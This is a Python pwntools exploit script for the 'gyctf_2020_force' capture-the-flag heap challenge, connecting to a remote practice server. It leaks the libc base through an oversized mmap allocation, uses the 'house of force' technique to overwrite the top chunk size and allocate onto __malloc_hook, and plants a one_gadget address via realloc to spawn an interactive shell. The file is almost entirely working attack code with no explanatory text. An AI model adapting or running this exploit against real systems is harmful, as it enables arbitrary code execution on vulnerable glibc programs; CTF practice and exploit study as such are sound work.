from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./gyctf_2020_force"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27243)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sla("2:puts\n", "1")
    sla("size\n", str(size))
    ru("bin addr ")
    addr = int(rud("\n"), 16)
    print("addr: ", hex(addr))
    sla("content\n", con)

    return addr


# house of force + mmap attack

# leak libc
info = add(0x200000, "a")
print("leak: ", hex(info))
base = info-0x10+0x201000
print("base: ", hex(base))

# count
libc = ELF(libc_path)
malloc_hook = base+libc.sym["__malloc_hook"]
print("malloc_hook: ", hex(malloc_hook))
realloc = base+libc.sym["realloc"]
oneshot = base+0x4526a

# alloc to malloc_hook
info = add(0x10, b"/bin/sh\00"*2+p64(0)+p64(0xffffffffffffffff))
offset = malloc_hook-0x10-info-0x10-0x20
add(offset, "a")
add(0x10, cyclic(0x8)+p64(oneshot)+p64(realloc+0x4))

# attack
sla("2:puts\n", "1")
sla("size\n", str(0x10))

p.interactive()


